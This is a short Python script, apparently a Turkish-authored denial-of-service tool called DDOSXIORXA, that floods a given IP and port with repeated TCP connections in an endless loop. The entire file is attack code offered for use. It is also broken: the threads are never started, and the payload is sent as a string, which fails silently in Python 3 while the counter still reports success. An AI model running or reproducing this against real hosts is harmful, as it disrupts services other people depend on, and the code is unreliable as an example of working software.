import socket
import threading
import sys

__author__ = "XIORXA"
__version__ = "1.0.0"
__status__ = "Geliştiriliyor"

def usage():
    print("|------------------------------------------------|")
    print(" Usage : python3 DDOSXIORXA.py (ip) (port) (pack)")
    print("|------------------------------------------------|")


def dos(host,port):
    try:
        s = socket.socket()
        s.settimeout(1)
        s.connect((host,port))
        s.send((pack))
        s.close()
        return True
    except:
        return False
try:
    host = sys.argv[1]
    port = int(sys.argv[2])
    boy = int(sys.argv[3])

    pack = ""


    for i in range(0,boy):
        pack += str(i)
        i+=1

    i = 0

    while True:
        threading.Thread(target=dos(host=host,port=port))
        i +=1
        print("Başarıyla Gönderilen Packet Sayısı : {} ".format(i))

except IndexError:
    usage()
